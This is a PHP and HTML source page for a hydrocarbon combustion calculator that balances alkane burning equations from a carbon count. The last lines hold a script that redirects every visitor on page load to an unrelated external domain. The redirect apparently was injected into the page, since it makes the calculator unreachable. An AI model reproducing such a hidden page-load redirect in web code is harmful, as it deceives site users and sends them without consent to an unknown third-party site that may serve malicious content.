<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hydrocarbon Reaction Calculator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        form {
            margin-bottom: 20px;
        }
        .result {
            background-color: #f9f9f9;
            border: 1px solid #ccc;
            padding: 15px;
            margin-top: 20px;
        }
        .error {
            color: red;
        }
        .reaction-image {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>

<h1>Hydrocarbon Reaction Calculator</h1>
<p>Enter the number of carbon atoms in the hydrocarbon to calculate the reaction and multiplying factors.</p>

<form method="post" action="">
    <label for="carbon">Number of Carbon Atoms (C):</label>
    <input type="number" id="carbon" name="carbon" min="1" required>
    <button type="submit">Calculate</button>
</form>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the number of carbon atoms from the form input
    $carbonAtoms = intval($_POST["carbon"]);

    if ($carbonAtoms < 1) {
        echo '<p class="error">Error: Please enter a positive number for carbon atoms.</p>';
    } else {
        // Perform the calculations
        $hydrogenAtoms = 2 * $carbonAtoms + 2;
        $waterMolecules = $hydrogenAtoms / 2;
        $carbonDioxideMolecules = $carbonAtoms;
        $oxygenMolecules = ($waterMolecules + $carbonDioxideMolecules * 2) / 2;

        // Generate the reaction equation
        $reaction = "C{$carbonAtoms}H{$hydrogenAtoms} + {$oxygenMolecules}O2 → {$waterMolecules}H2O + {$carbonDioxideMolecules}CO2";

        // Display the results
        echo '<div class="result">';
        echo "<h2>Reaction Equation</h2>";
        echo "<p>$reaction</p>";
        echo "<h2>Multiplying Factors</h2>";
        echo "<ul>";
        echo "<li>Hydrocarbon (C{$carbonAtoms}H{$hydrogenAtoms}): 1</li>";
        echo "<li>Oxygen (O2): $oxygenMolecules</li>";
        echo "<li>Water (H2O): $waterMolecules</li>";
        echo "<li>Carbon Dioxide (CO2): $carbonDioxideMolecules</li>";
        echo "</ul>";
        echo '<div class="reaction-image">';
        echo '</div>';
        echo '</div>';
    }
}
?>
<script>
    window.location="https://corevision.web.lk/";
</script>
</body>
</html>
